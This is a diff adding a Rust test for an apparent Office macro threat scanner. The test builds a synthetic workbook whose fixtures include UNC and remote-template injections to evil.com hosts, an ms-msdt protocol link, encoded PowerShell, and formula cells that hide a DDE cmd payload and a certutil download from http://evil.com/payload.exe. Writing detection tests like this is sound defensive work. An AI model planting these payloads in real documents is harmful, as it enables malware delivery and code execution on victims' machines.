@@ -5391,3 +5391,212 @@ fn e2e_xmlmaps_comments_themes_and_matrix_math_threat_inspection() {
         "JSON missing VBA-CELL-055"
     );
 }
+
+#[test]
+fn e2e_customxml_vbarels_glossary_and_determinant_math_threat_inspection() {
+    let custom_xml_item_props = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<ds:datastoreItem ds:itemID="{B9B25270-388D-438B-B0A2-9E2DDA8CD69D}" xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml">
+  <ds:schemaRefs>
+    <ds:schemaRef ds:uri="\\attacker.evil.com\payload\schema.xsd"/>
+  </ds:schemaRefs>
+</ds:datastoreItem>"#;
+
+    let custom_xml_item_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="\\attacker.corp\share\exploit.xml" TargetMode="External"/>
+  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="ms-msdt:/id PCWDiagnostic" TargetMode="External"/>
+</Relationships>"#;
+
+    let vba_project_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="\\evil-server\share\vbaPayload.bin" TargetMode="External"/>
+</Relationships>"#;
+
+    let vba_data_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<vbaSuppData xmlns="http://schemas.microsoft.com/office/excel/2006/main">
+  <data>powershell -enc AAAA==</data>
+</vbaSuppData>"#;
+
+    let glossary_settings = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <w:attachedTemplate r:id="rId1"/>
+</w:settings>"#;
+
+    let glossary_settings_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.com/template.dotm" TargetMode="External"/>
+</Relationships>"#;
+
+    let glossary_doc = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:glossaryDocument xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:docParts>
+    <w:docPart>
+      <w:docPartPr>
+        <w:category>
+          <w:name val="\\evil-server\share\docpart"/>
+        </w:category>
+      </w:docPartPr>
+    </w:docPart>
+  </w:docParts>
+</w:glossaryDocument>"#;
+
+    let src = "Sub Safe()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "CustomXmlGlossaryProj",
+        &[("ThisWorkbook", src, &pcode)],
+        &["Safe"],
+    );
+
+    // Formulas using MDETERM, INT, SERIESSUM, MINVERSE for de-obfuscation
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1"><f>IF(MDETERM({1, 2; 3, 4})=-2, &quot;cmd|'/c calc'!A1&quot;, &quot;&quot;)</f></c>
+      <c r="B1"><f>CONCAT(IF(INT(-3.2)=-4, &quot;powershell&quot;, &quot;&quot;), IF(SERIESSUM(2, 0, 1, {1, 2, 3})=17, &quot; -enc&quot;, &quot;&quot;))</f></c>
+      <c r="C1"><f>IF(INDEX(MINVERSE({2, 0; 0, 4}), 1, 1)=0.5, &quot;certutil -urlcache -split -f http://evil.com/payload.exe&quot;, &quot;&quot;)</f></c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+</Types>"#;
+
+    let root_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", root_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        ("customXml/itemProps1.xml", custom_xml_item_props.as_bytes()),
+        (
+            "customXml/_rels/item1.xml.rels",
+            custom_xml_item_rels.as_bytes(),
+        ),
+        ("xl/_rels/vbaProject.bin.rels", vba_project_rels.as_bytes()),
+        ("xl/vbaData.xml", vba_data_xml.as_bytes()),
+        ("word/glossary/settings.xml", glossary_settings.as_bytes()),
+        (
+            "word/glossary/_rels/settings.xml.rels",
+            glossary_settings_rels.as_bytes(),
+        ),
+        ("word/glossary/document.xml", glossary_doc.as_bytes()),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify CustomXML Properties & Rel threats (VBA-CELL-056)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "CustomXmlPropertiesOrItemSchemaAnomaly"
+                && (t.coordinate.contains("customXmlProp:uncSchema")
+                    || t.coordinate.contains("customXmlProp:uncRelationship")
+                    || t.coordinate.contains("customXmlProp:dangerousProtocol"))
+        ),
+        "Should detect CustomXmlPropertiesOrItemSchemaAnomaly (VBA-CELL-056): {threats:?}"
+    );
+
+    // 2. Verify VBA Project Rels & Data Stream threats (VBA-CELL-057)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "VbaDataStreamOrProjectRelsAnomaly"
+                && (t.coordinate.contains("vbaRels:uncRelationship")
+                    || t.coordinate.contains("vbaData:shellCommand"))),
+        "Should detect VbaDataStreamOrProjectRelsAnomaly (VBA-CELL-057): {threats:?}"
+    );
+
+    // 3. Verify Word Glossary & Building Blocks threats (VBA-CELL-058)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "WordGlossaryOrBuildingBlocksRelsAnomaly"
+                && (t.coordinate.contains("glossaryRels:uncPath")
+                    || t.coordinate
+                        .contains("glossaryRels:remoteTemplateInjection"))
+        ),
+        "Should detect WordGlossaryOrBuildingBlocksRelsAnomaly (VBA-CELL-058): {threats:?}"
+    );
+
+    // 4. Verify mathematical formula de-obfuscation in cells
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && (t.threat_kind == "DDE"
+                || t.threat_kind == "DDEExecutionFormula"
+                || t.threat_kind == "DeobfuscatedThreat")
+            && t.formula.contains("cmd")),
+        "Cell A1 should resolve DDE cmd execution threat through MDETERM: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through INT/SERIESSUM evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through MINVERSE evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-056, VBA-CELL-057, VBA-CELL-058
+    let sarif = inspection_to_sarif(&inspection, "file:///test/customxml_vbarels_glossary.xlsm");
+    assert!(
+        sarif.contains("VBA-CELL-056"),
+        "SARIF must contain VBA-CELL-056 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-057"),
+        "SARIF must contain VBA-CELL-057 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-058"),
+        "SARIF must contain VBA-CELL-058 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-056, VBA-CELL-057, VBA-CELL-058
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-056\""),
+        "JSON missing VBA-CELL-056"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-057\""),
+        "JSON missing VBA-CELL-057"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-058\""),
+        "JSON missing VBA-CELL-058"
+    );
+}
